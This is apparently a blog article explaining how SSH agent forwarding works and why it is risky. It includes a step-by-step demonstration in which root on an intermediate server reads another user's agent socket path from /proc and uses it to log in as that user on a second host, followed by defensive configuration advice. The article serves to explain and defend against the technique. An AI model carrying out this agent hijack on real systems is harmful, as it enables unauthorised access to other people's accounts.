If your network requires chained ssh sessions (to access a restricted network, for example), agent forwarding becomes extremely helpful. With agent forwarding it\xe2\x80\x99s possible for me to connect from my laptop to my dev server and from there run an\xc2 svn checkout\xc2 from yet another server, all without passwords, while keeping my private key safe on my local workstation. This can be dangerous, though. A quick web search will reveal several articles indicating this is only safe if the intermediate hosts are trustworthy. Rarely, however, will you find an explanation of\xc2 why\xc2 it\xe2\x80\x99s dangerous. That\xe2\x80\x99s what this article is for. But first, some background. How Passwordless Authentication Works When authenticating in normal mode, SSH uses your password to prove that you are who you say you are. The server compares a hash of this password to one it has on file, verifies that the hashes match, and lets you in. If an attacker is able to break the encryption used to protect your password while it\xe2\x80\x99s being sent to the server, they can steal the it and log in as you whenever they desire. If an attacker is allowed to perform hundreds of thousands of attempts, they can eventually guess your password. A much safer authentication method is\xc2 public key authentication, a way of logging in without a password. Public key authentication requires a matched pair of public and private keys. The public key encrypts messages that can only be decrypted with the private key. The remote computer uses its copy of your public key to encrypt a secret message to you. You prove you are you by decrypting the message using your private key and sending the message back to the remote computer. Your private key remains safely on your local computer the entire time, safe from attack. The private key is valuable and must be protected, so by default it is stored in an encrypted format. Unfortunately this means entering your encryption passphrase before using it. Many articles suggest using passphrase-less (unencrypted) private keys to avoid this inconvenience. That\xe2\x80\x99s a bad idea, as anyone with access to your workstation (via physical access, theft, or hackery) now also has free access to any computers configured with your public key. OpenSSH includes\xc2 ssh-agent, a daemon that runs on your local workstation. It loads a decrypted copy of your private key into memory, so you only have to enter your passphrase once. It then provides a local\xc2 socket\xc2 that the ssh client can use to ask it to decrypt the encrypted message sent back by the remote server. Your private key stays safely ensconced in the ssh-agent process\xe2\x80\x99 memory while still allowing you to ssh around without typing in passwords. How ForwardAgent Works Many tasks require \xe2\x80\x9cchaining\xe2\x80\x9d ssh sessions. Consider my example from earlier: I ssh from my workstation to the dev server. While there, I need to perform an svn update, using the \xe2\x80\x9csvn+ssh\xe2\x80\x9d protocol. Since it would be silly to leave an unencrypted copy of my super-secret private key on a shared server, I\xe2\x80\x99m now stuck with password authentication. If, however, I enabled \xe2\x80\x9cForwardAgent\xe2\x80\x9d in the ssh config on my workstation, ssh uses its built-in tunneling capabilities to create another socket on the dev server that is tunneled back to the ssh-agent socket on my local workstation. This means that the ssh client on the dev server can now send \xe2\x80\x9cdecrypt this secret message\xe2\x80\x9d requests directly back to the ssh-agent running on my workstation, authenticating itself to the svn server without ever having access to my private key. Why This Can Be Dangerous Simply put, anyone with root privilege on the the intermediate server can make free use of your ssh-agent to authenticate them to other servers. A simple demonstration shows how trivially this can be done. Hostnames and usernames have been changed to protect the innocent. My laptop is running ssh-agent, which communicates with the ssh client programs via a socket. The path to this socket is stored in the\xc2 SSH_AUTH_SOCK\xc2 environment variable: mylaptop:~ env|grep SSH_AUTH_SOCK SSH_AUTH_SOCK=/tmp/launch-oQKpeY/Listeners mylaptop:~ ls -l /tmp/launch-oQKpeY/Listeners srwx------ 1 alice wheel 0 Apr 3 11:04 /tmp/launch-oQKpeY/Listeners The\xc2 ssh-add\xc2 program lets us view and interact with keys in the agent: mylaptop:~ alice$ ssh-add -l 2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA) I have \xe2\x80\x9cForwardAgent yes\xe2\x80\x9d in the\xc2 ~/.ssh/config\xc2 on my laptop. So\xc2 ssh\xc2 is going to create a tunnel connecting the local socket to a local socket on the remote server: mylaptop:~ alice$ ssh seattle seattle:~ $ env|grep SSH_AUTH_SOCK SSH_AUTH_SOCK=/tmp/ssh-WsKcHa9990/agent.9990 Even though my keys are not installed on \xe2\x80\x9cseattle\xe2\x80\x9d, the ssh client programs are still able to access the agent running on my local machine: seattle:~ alice $ ssh-add -l 2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA) So\xe2\x80\xa6 who can we mess with? seattle:~ alice $ who alice pts/0 2012-04-06 18:24 (office.example.com) bob pts/1 2012-04-03 01:29 (office.example.com) alice pts/3 2012-04-06 18:31 (office.example.com) alice pts/5 2012-04-06 18:31 (office.example.com) alice pts/6 2012-04-06 18:33 (office.example.com) charlie pts/23 2012-04-06 13:10 (office.example.com) charlie pts/27 2012-04-03 12:32 (office.example.com) bob pts/29 2012-04-02 10:58 (office.example.com) I\xe2\x80\x99ve never liked Bob. To find his agent connection, I need to find the child process of one of his ssh sessions: seattle:~ alice $ sudo -s [sudo] password for alice: seattle:~ root # pstree -p bob sshd(16816)\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80bash(16817) sshd(25296)\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80bash(25297)\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80vim(14308) There are several ways for root to view the environment of a running process. On Linux, the data is available in\xc2 /proc/<pid>/environ. Since it\xe2\x80\x99s stored in NULL-terminated strings, I\xe2\x80\x99ll use\xc2 tr\xc2 to convert the NULLs to newlines: seattle:~ root # tr '' 'n' < /proc/16817/environ | grep SSH_AUTH_SOCK SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 I now have everything I need to know in order to hijack Bob\xe2\x80\x99s\xc2 ssh-agent: seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh-add -l 2048 05:f1:12:f2:e6:ad:cb:0b:60:e3:92:fa:c3:62:19:17 /home/bob/.ssh/id_rsa (RSA) If I happen to have a specific target in mind, I should now be able to connect directly. Otherwise, just watching the process list or grepping through Bob\xe2\x80\x99s history file should present plenty of targets of opportunity. In this case, I know Bob has all sorts of super secret files stored on the server named \xe2\x80\x9cboston\xe2\x80\x9d: seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston bob@boston:~$ whoami bob I have succesfully parlayed my root privileges on \xe2\x80\x9cseattle\xe2\x80\x9d to access as bob on \xe2\x80\x9cboston\xe2\x80\x9d. I\xe2\x80\x99ll bet I can use that to get him fired. Protect Yourself! Don\xe2\x80\x99t let your ssh-agent store your keys indefinitely. On OS X, configure your Keychain to lock after inactivity or when your screen locks. On other Unix-y platforms, pass the\xc2 -t\xc2 \xc2 option to\xc2 ssh-agent\xc2 so its keys will be removed after\xc2 \xc2 seconds. Don\xe2\x80\x99t enable agent forwarding when connecting to untrustworthy hosts. Fortunately, the\xc2 ~/.ssh/config\xc2 syntax makes this fairly simple: Host trustworthyhost ForwardAgent yes Host * ForwardAgent no Recommended Reading OpenSSH key management\xc2 \xe2\x80\x93 Daniel Robbins An Illustrated Guide to SSH Agent Forwarding\xc2 \xe2\x80\x93 Steve Friedl ssh-agent manual ssh-add manual Get our newsletter!
